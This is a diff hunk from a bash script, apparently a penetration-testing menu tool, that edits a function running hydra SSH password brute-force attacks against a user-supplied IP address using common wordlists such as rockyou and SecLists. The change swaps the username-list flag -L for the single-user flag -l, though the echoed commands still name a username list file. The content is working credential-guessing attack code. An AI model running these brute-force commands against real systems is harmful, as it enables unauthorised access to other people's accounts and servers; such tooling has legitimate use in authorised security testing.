@@ -614,17 +614,17 @@ hydra_ssh_userdefined(){
   echo -e "\n4) For 1 million most common"
   read wordlist
   if [ $wordlist = 1 ]; then
-    echo "hydra -L /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10k_most_common.txt ssh://$sshIP"
-    hydra -L $user -P /opt/SecLists/Passwords/10k_most_common.txt ssh://$sshIP
+    echo "hydra -l /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10k_most_common.txt ssh://$sshIP"
+    hydra -l $user -P /opt/SecLists/Passwords/10k_most_common.txt ssh://$sshIP
   elif [ $wordlist = 2 ]; then
-    echo "hydra -L /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10_million_password_list_top_100000.txt ssh://$sshIP"
-    hydra -L $user -P /opt/SecLists/Passwords/10_million_password_list_top_100000.txt ssh://$sshIP
+    echo "hydra -l /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10_million_password_list_top_100000.txt ssh://$sshIP"
+    hydra -l $user -P /opt/SecLists/Passwords/10_million_password_list_top_100000.txt ssh://$sshIP
   elif [ $wordlist = 3 ]; then
-    echo "hydra -L /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/rockyou.txt ssh://$sshIP"
-    hydra -L $user -P /usr/share/wordlists/rockyou.txt ssh://$sshIP
+    echo "hydra -l /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/rockyou.txt ssh://$sshIP"
+    hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$sshIP
   elif [ $wordlist = 4 ]; then
-    echo "hydra -L /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10_million_password_list_top_1000000.txt ssh://$sshIP"
-    hydra -L $user -P /opt/SecLists/Passwords/10_million_password_list_top_1000000.txt ssh://$sshIP
+    echo "hydra -l /opt/SecLists/Usernames/Names/name.txt -P /opt/SecLists/Passwords/10_million_password_list_top_1000000.txt ssh://$sshIP"
+    hydra -l $user -P /opt/SecLists/Passwords/10_million_password_list_top_1000000.txt ssh://$sshIP
   else
     echo -e "\nInvalid Option!"
     hydra_ssh_userdefined
